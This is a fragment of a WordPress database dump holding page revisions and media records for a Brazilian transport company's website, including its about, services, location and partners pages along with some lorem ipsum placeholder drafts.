(93, 1, '2015-03-19 15:17:05', '2015-03-19 18:17:05', 'A A.S. Aaraujo Transportes nasceu no coração do diretor André Silva Araujo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. Após vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!Com todas estrutura implantada A.S. Araujo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-03-19 15:17:05', '2015-03-19 18:17:05', '', 26, 'http://araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(95, 1, '2015-03-19 15:20:32', '2015-03-19 18:20:32', 'Quis a pulvinar tempor porta vel massa, eu amet, aenean adipiscing in lectus dolor dapibus sed hac et, sociis vel? Cursus? Odio! In elementum arcu? Velit eu in habitasse porta mattis natoque lectus nec parturient ac! Lacus pid, elit, tristique dolor parturient ultrices quis turpis! Tincidunt nisi et urna magnis enim, rhoncus integer et turpis pellentesque vel eros! Cum urna! Nisi nisi, rhoncus nisi, scelerisque rhoncus! Mid porttitor vel mauris purus purus, mus et sociis pulvinar! Vel eu et hac? Pulvinar vut dapibus in, rhoncus montes et porttitor auctor, et sit a. Nunc amet augue quis? Nisi non scelerisque proin cum, lectus, pellentesque risus etiam! Nec hac dictumst dis et. Sagittis amet non dolor, phasellus mid nunc, elementum! Integer. Dignissim.\r\n\r\nPorttitor, odio et ridiculus augue montes tincidunt a nisi, et ridiculus. A, nisi! Natoque dictumst, phasellus phasellus. Mid augue quis ut odio lectus, sagittis platea! Phasellus ac sit integer diam nec. Aliquam, purus in tristique enim vel scelerisque? Magnis. Dolor sociis cras vel, proin platea et amet! Lundium scelerisque! Porta! Placerat scelerisque et sed porta, enim porttitor porttitor amet, placerat ut quis lectus a, ut egestas dignissim, et! Porttitor! Lorem pellentesque nunc auctor, scelerisque ac enim in facilisis ultricies! Pulvinar placerat? Pulvinar phasellus porttitor placerat ac, adipiscing odio in purus magna sagittis nascetur eu porttitor tincidunt amet elit, scelerisque? Tincidunt odio, porttitor ut, et urna, amet magna sagittis tincidunt eu, risus nascetur dis nisi amet lacus lacus sed in.', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-03-19 15:20:32', '2015-03-19 18:20:32', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(96, 1, '2015-03-19 15:21:17', '2015-03-19 18:21:17', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n<ul>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional;</li>\r\n</ul>\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\nNosso diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações.\r\n\r\n<strong>Araújo Transportes, sempre com você!</strong>', 'Nossos Serviços', '', 'publish', 'open', 'open', '', 'nossos-servicos', '', '', '2015-04-10 15:12:57', '2015-04-10 18:12:57', '', 0, 'http://araujotrans.com.br/?page_id=96', 0, 'page', '', 0),
(97, 1, '2015-03-19 15:21:17', '2015-03-19 18:21:17', 'In lundium urna aliquet lectus integer ac magna? Vel et hac habitasse diam pid tempor odio, adipiscing magna turpis vel magna, nec velit habitasse, magnis nisi et arcu penatibus egestas! Phasellus ridiculus elementum placerat risus rhoncus! Magna proin nascetur lacus in integer augue porta eu amet rhoncus a. A diam augue et. Penatibus aliquet sed enim a a in dictumst, in arcu enim? Ultrices dictumst turpis lorem ut facilisis hac turpis phasellus, rhoncus ut a a, purus phasellus a, et non. Nisi magna arcu. Scelerisque, lectus tortor ut, urna turpis, turpis amet in elementum porta a mid ac lacus in, tortor est. Nec egestas! Adipiscing dictumst sit montes rhoncus eros massa, nec turpis nunc ultrices non risus pulvinar vel! Egestas.\r\n\r\nVel pid tortor lacus lectus scelerisque sit. Sit sit ridiculus tincidunt. Magna dignissim dolor dictumst nec et magna quis? Lundium sagittis adipiscing duis magna scelerisque nec magna velit rhoncus? Habitasse quis dapibus, phasellus dictumst magna amet enim ut est. Platea ac amet vel etiam. Mauris ultricies lacus lundium nunc a. Parturient rhoncus mattis et! Sed! Aliquet porta nisi enim? A rhoncus? Auctor tristique eros parturient ultricies egestas, et! Ac? Cras rhoncus nec mus a integer dictumst integer, elementum phasellus! Nec vut massa dis egestas rhoncus, tincidunt facilisis egestas cursus! In augue vut nunc pulvinar natoque, scelerisque quis sit mauris, a dignissim. Mus auctor turpis placerat lacus urna et pulvinar, odio, ultricies a penatibus! Magnis egestas facilisis ac? Augue dapibus.', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-03-19 15:21:17', '2015-03-19 18:21:17', '', 96, 'http://araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(98, 1, '2015-03-19 15:24:19', '2015-03-19 18:24:19', ' ', '', '', 'publish', 'open', 'open', '', '98', '', '', '2015-04-09 00:03:18', '2015-04-09 03:03:18', '', 0, 'http://araujotrans.com.br/?p=98', 3, 'nav_menu_item', '', 0),
(99, 1, '2015-03-20 01:22:31', '2015-03-20 04:22:31', '[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'open', 'open', '', '85-revision-v1', '', '', '2015-03-20 01:22:31', '2015-03-20 04:22:31', '', 85, 'http://araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(100, 1, '2015-03-20 02:15:27', '2015-03-20 05:15:27', '<strong>Venha nos visitar!</strong>\nAvenida de Pinedo, 837 - sl.03\n<strong>CEP:</strong> 04764-001 - Socorro, São Paulo/SP\n<strong>Tel:</strong>11 7885-6363\n<strong>Horário de Funcionamento:</strong> Hoje 08:00 – 18:00\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'open', 'open', '', '85-autosave-v1', '', '', '2015-03-20 02:15:27', '2015-03-20 05:15:27', '', 85, 'http://araujotrans.com.br/85-autosave-v1/', 0, 'revision', '', 0),
(101, 1, '2015-03-20 02:06:39', '2015-03-20 05:06:39', '<strong>Venha nos visitar!</strong>\r\nAvenida de Pinedo, 837 - sl.03\r\n<strong>CEP:</strong> 04764-001 - Socorro, São Paulo/SP\r\n<strong>Tel:</strong>\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'open', 'open', '', '85-revision-v1', '', '', '2015-03-20 02:06:39', '2015-03-20 05:06:39', '', 85, 'http://araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(102, 1, '2015-03-20 02:14:25', '2015-03-20 05:14:25', '<strong>Venha nos visitar!</strong>\r\nAvenida de Pinedo, 837 - sl.03\r\n<strong>CEP:</strong> 04764-001 - Socorro, São Paulo/SP\r\n<strong>Tel:</strong>11 7885-6363\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'open', 'open', '', '85-revision-v1', '', '', '2015-03-20 02:14:25', '2015-03-20 05:14:25', '', 85, 'http://araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(103, 1, '2015-03-20 02:15:29', '2015-03-20 05:15:29', '<strong>Venha nos visitar!</strong>\r\nAvenida de Pinedo, 837 - sl.03\r\n<strong>CEP:</strong> 04764-001 - Socorro, São Paulo/SP\r\n<strong>Tel:</strong>11 7885-6363\r\n<strong>Horário de Funcionamento:</strong> Hoje 08:00 – 18:00\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'open', 'open', '', '85-revision-v1', '', '', '2015-03-20 02:15:29', '2015-03-20 05:15:29', '', 85, 'http://araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(104, 1, '2015-03-20 14:14:21', '2015-03-20 17:14:21', '<strong>Venha nos visitar!</strong>\r\n\r\nAvenida de Pinedo, 837 - sl.03\r\n<strong>CEP:</strong> 04764-001 - Socorro, São Paulo/SP\r\n<strong>Tel:</strong>11 25971454 / 11 25971463\r\n<strong>Horário de Funcionamento:</strong> Hoje 08:00 – 18:00\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'open', 'open', '', '85-revision-v1', '', '', '2015-03-20 14:14:21', '2015-03-20 17:14:21', '', 85, 'http://araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(106, 1, '2015-04-08 19:15:22', '2015-04-08 22:15:22', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\n \n<ul>\n	<li>Agendamento Prévio para outros Estados;</li>\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional; </li>\n </ul>\n\nA.S. Araujo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações. \n\n\nNosso diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações. Araujo Transportes, sempre com você!', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-autosave-v1', '', '', '2015-04-08 19:15:22', '2015-04-08 22:15:22', '', 96, 'http://araujotrans.com.br/96-autosave-v1/', 0, 'revision', '', 0);
INSERT INTO `wp_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(107, 1, '2015-03-20 15:25:42', '2015-03-20 18:25:42', 'Nossos serviços estão centralizados no Atendimento Express em \"Entrega e Retirada\" - sendo de porta a porta para São Paulo, Capital, Litoral e Interior. Também fazemos agendamento Prévio para outros Estados, além do atendimento a Carga Viva (Animais de pequeno porte e médio porte como cães, gatos, etc.). Com uma super estrutura e responsabilidade no transporte do animal. A Araujo Transporte organiza Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional.\r\n\r\nNosso Diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações. ', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-03-20 15:25:42', '2015-03-20 18:25:42', '', 96, 'http://araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(108, 1, '2015-04-15 14:47:49', '2015-04-15 17:47:49', 'Através dos anos fomos fazendo parcerias muito importantes para o crescimento da Araújo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\n\n<div class=\"parceiros\"><a href=\"http://www.boxjoanninha.com.br/novo/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/box_joaninha-150x150.jpg\" /></a></div>\n\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\n\n<div class=\"parceiros\"><a href=\"http://www.joanninha.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha-150x150.jpg\" /></a></div>\n\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\n\n<a href=\"http://www.araujotrans.com.br/wp-content/uploads/2015/03/Naked.jpg\"><img src=\"\" alt=\"Naked\" width=\"300\" height=\"300\" class=\"alignnone size-medium wp-image-181\" /></a><div class=\"parceiros\"><a href=\"http://www.sorvetenaked.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/03/Naked-300x300.jpg\" /></a></div>\n\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\n\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\n\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-autosave-v1', '', '', '2015-04-15 14:47:49', '2015-04-15 17:47:49', '', 91, 'http://araujotrans.com.br/91-autosave-v1/', 0, 'revision', '', 0),
(109, 1, '2015-03-20 15:28:29', '2015-03-20 18:28:29', 'Através de anos fomos fazendo parcerias muito importantes para o crescimento da Araujo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-03-20 15:28:29', '2015-03-20 18:28:29', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(110, 1, '2015-03-20 23:52:42', '2015-03-21 02:52:42', '', 'HRS', '', 'inherit', 'open', 'open', '', 'hrs', '', '', '2015-03-20 23:52:42', '2015-03-21 02:52:42', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/HRS.jpg', 0, 'attachment', 'image/jpeg', 0),
(112, 1, '2015-03-30 21:34:29', '2015-03-31 00:34:29', '', 'face', '', 'inherit', 'open', 'open', '', 'face', '', '', '2015-03-30 21:34:29', '2015-03-31 00:34:29', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/face.png', 0, 'attachment', 'image/png', 0),
(113, 1, '2015-03-30 21:34:33', '2015-03-31 00:34:33', '', 'rss', '', 'inherit', 'open', 'open', '', 'rss-2', '', '', '2015-03-30 21:34:33', '2015-03-31 00:34:33', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/rss.png', 0, 'attachment', 'image/png', 0),
(114, 1, '2015-03-30 21:34:35', '2015-03-31 00:34:35', '', 'twitter', '', 'inherit', 'open', 'open', '', 'twitter', '', '', '2015-03-30 21:34:35', '2015-03-31 00:34:35', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/twitter.png', 0, 'attachment', 'image/png', 0),
(115, 1, '2015-03-31 20:40:42', '2015-03-31 23:40:42', '<strong>Venha nos visitar!</strong>\r\n\r\nAvenida de Pinedo, 837 - sl.03\r\n<strong>CEP:</strong> 04764-001 - Socorro, São Paulo/SP\r\n<strong>Tel:</strong>11 25971454 / 11 25971463\r\n<strong>Horário de Funcionamento:</strong> de segunda a sexta das 08:00 – 18:00\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'open', 'open', '', '85-revision-v1', '', '', '2015-03-31 20:40:42', '2015-03-31 23:40:42', '', 85, 'http://araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(116, 1, '2015-03-31 20:40:54', '2015-03-31 23:40:54', '<strong>Venha nos visitar!</strong>\r\n\r\nAvenida de Pinedo, 837 - sl.03\r\n<strong>CEP:</strong> 04764-001 - Socorro, São Paulo/SP\r\n<strong>Tel:</strong>11 25971454 / 11 25971463\r\n<strong>Horário de Funcionamento:</strong> segunda a sexta das 08:00 – 18:00\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'open', 'open', '', '85-revision-v1', '', '', '2015-03-31 20:40:54', '2015-03-31 23:40:54', '', 85, 'http://araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(117, 1, '2015-03-31 20:49:29', '2015-03-31 23:49:29', '<strong>Venha nos visitar!</strong>\r\n\r\nAvenida de Pinedo, 837 - sl.03\r\n<strong>CEP:</strong> 04764-001 - Socorro, São Paulo/SP\r\n<strong>Tel:</strong> (11) 25971454 / (11) 25971463\r\n<strong>Horário de Funcionamento:</strong> segunda a sexta das 08:00 – 18:00\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'open', 'open', '', '85-revision-v1', '', '', '2015-03-31 20:49:29', '2015-03-31 23:49:29', '', 85, 'http://araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(118, 1, '2015-03-31 21:10:52', '2015-04-01 00:10:52', '', 'Logo-Araujo-Transportes', '', 'inherit', 'open', 'open', '', 'logo-araujo-transportes', '', '', '2015-03-31 21:10:52', '2015-04-01 00:10:52', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/Logo-Araujo-Transportes.jpg', 0, 'attachment', 'image/jpeg', 0),
(119, 1, '2015-03-31 21:15:22', '2015-04-01 00:15:22', '', 'Logo-Araujo-Transportes-2', '', 'inherit', 'open', 'open', '', 'logo-araujo-transportes-2-2', '', '', '2015-03-31 21:15:22', '2015-04-01 00:15:22', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/Logo-Araujo-Transportes-2.png', 0, 'attachment', 'image/png', 0),
(121, 1, '2015-04-02 14:31:56', '2015-04-02 17:31:56', '', 'Decesiva', '', 'inherit', 'open', 'open', '', 'decesiva', '', '', '2015-04-02 14:32:23', '2015-04-02 17:32:23', '', 91, 'http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva.jpg', 0, 'attachment', 'image/jpeg', 0),
(122, 1, '2015-04-02 14:31:57', '2015-04-02 17:31:57', '', 'mandae', '', 'inherit', 'open', 'open', '', 'mandae', '', '', '2015-04-02 14:32:23', '2015-04-02 17:32:23', '', 91, 'http://araujotrans.com.br/wp-content/uploads/2015/04/mandae.jpg', 0, 'attachment', 'image/jpeg', 0),
(123, 1, '2015-04-02 14:31:58', '2015-04-02 17:31:58', '', 'phoenix', '', 'inherit', 'open', 'open', '', 'phoenix', '', '', '2015-04-02 14:32:23', '2015-04-02 17:32:23', '', 91, 'http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix.jpg', 0, 'attachment', 'image/jpeg', 0),
(124, 1, '2015-04-02 14:31:58', '2015-04-02 17:31:58', '', 'via', '', 'inherit', 'open', 'open', '', 'via', '', '', '2015-04-02 14:32:23', '2015-04-02 17:32:23', '', 91, 'http://araujotrans.com.br/wp-content/uploads/2015/04/via.jpg', 0, 'attachment', 'image/jpeg', 0),
(125, 1, '2015-04-02 14:34:30', '2015-04-02 17:34:30', 'Através de anos fomos fazendo parcerias muito importantes para o crescimento da Araujo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-300x300.jpg\" />\r\n\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-300x300.jpg\" />\r\n\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-300x300.jpg\" />\r\n\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-300x300.jpg\" />', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-02 14:34:30', '2015-04-02 17:34:30', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(126, 1, '2015-04-02 14:35:33', '2015-04-02 17:35:33', 'Através de anos fomos fazendo parcerias muito importantes para o crescimento da Araujo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" />\r\n\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" />\r\n\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" />\r\n\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" />', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-02 14:35:33', '2015-04-02 17:35:33', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(127, 1, '2015-04-02 14:36:22', '2015-04-02 17:36:22', 'Através de anos fomos fazendo parcerias muito importantes para o crescimento da Araujo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" />\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" />\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" />\r\n<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" />\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-02 14:36:22', '2015-04-02 17:36:22', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(128, 1, '2015-04-02 14:37:54', '2015-04-02 17:37:54', 'Através de anos fomos fazendo parcerias muito importantes para o crescimento da Araujo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></div>\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-02 14:37:54', '2015-04-02 17:37:54', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(129, 1, '2015-04-02 14:51:37', '2015-04-02 17:51:37', '', 'PHOTO', '', 'inherit', 'open', 'open', '', 'photo', '', '', '2015-04-02 14:51:37', '2015-04-02 17:51:37', '', 91, 'http://araujotrans.com.br/wp-content/uploads/2015/03/PHOTO.png', 0, 'attachment', 'image/png', 0),
(130, 1, '2015-04-02 14:54:52', '2015-04-02 17:54:52', '<style>\r\n.parceiros{\r\n  float: left;\r\n  margin-left: 10px;\r\n  background: url(http://araujotrans.com.br/wp-content/uploads/2015/03/PHOTO.png);\r\n}\r\n</style>\r\n\r\nAtravés de anos fomos fazendo parcerias muito importantes para o crescimento da Araujo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></div>\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-02 14:54:52', '2015-04-02 17:54:52', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(131, 1, '2015-04-02 14:58:36', '2015-04-02 17:58:36', '<style>\r\n.parceiros{\r\n    float: left;\r\n  margin-left: 20px;\r\n  border: 2px solid red;\r\n  border-radius: 5px;\r\n}\r\n</style>\r\n\r\nAtravés de anos fomos fazendo parcerias muito importantes para o crescimento da Araujo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></div>\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-02 14:58:36', '2015-04-02 17:58:36', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(132, 1, '2015-04-02 15:02:37', '2015-04-02 18:02:37', 'Através de anos fomos fazendo parcerias muito importantes para o crescimento da Araujo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></div>\r\n<div class=\"parceiros\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></div>\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-02 15:02:37', '2015-04-02 18:02:37', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(133, 1, '2015-04-02 15:11:58', '2015-04-02 18:11:58', 'Através de anos fomos fazendo parcerias muito importantes para o crescimento da Araujo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\r\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\r\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\r\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-02 15:11:58', '2015-04-02 18:11:58', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(134, 1, '2015-04-02 15:17:50', '2015-04-02 18:17:50', '', 'email', '', 'inherit', 'open', 'open', '', 'email', '', '', '2015-04-02 15:17:50', '2015-04-02 18:17:50', '', 91, 'http://araujotrans.com.br/wp-content/uploads/2015/03/email.png', 0, 'attachment', 'image/png', 0),
(135, 1, '2015-04-02 15:17:51', '2015-04-02 18:17:51', '', 'fale conosco', '', 'inherit', 'open', 'open', '', 'fale-conosco-2', '', '', '2015-04-02 15:17:51', '2015-04-02 18:17:51', '', 91, 'http://araujotrans.com.br/wp-content/uploads/2015/03/fale-conosco.png', 0, 'attachment', 'image/png', 0),
(136, 1, '2015-04-02 15:17:52', '2015-04-02 18:17:52', '', 'mapa', '', 'inherit', 'open', 'open', '', 'mapa', '', '', '2015-04-02 15:17:52', '2015-04-02 18:17:52', '', 91, 'http://araujotrans.com.br/wp-content/uploads/2015/03/mapa.png', 0, 'attachment', 'image/png', 0),
(137, 1, '2015-04-02 15:17:52', '2015-04-02 18:17:52', '', 'tele', '', 'inherit', 'open', 'open', '', 'tele', '', '', '2015-04-02 15:17:52', '2015-04-02 18:17:52', '', 91, 'http://araujotrans.com.br/wp-content/uploads/2015/03/tele.png', 0, 'attachment', 'image/png', 0),
(138, 1, '2015-04-02 15:36:30', '2015-04-02 18:36:30', '', 'site', '', 'inherit', 'open', 'open', '', 'site', '', '', '2015-04-02 15:36:30', '2015-04-02 18:36:30', '', 91, 'http://araujotrans.com.br/wp-content/uploads/2015/03/site.png', 0, 'attachment', 'image/png', 0),
(140, 1, '2015-04-07 14:27:48', '2015-04-07 17:27:48', '', 'fiorinos-araujo-2', '', 'inherit', 'open', 'open', '', 'fiorinos-araujo-2', '', '', '2015-04-07 14:27:48', '2015-04-07 17:27:48', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/04/fiorinos-araujo-2.jpg', 0, 'attachment', 'image/jpeg', 0),
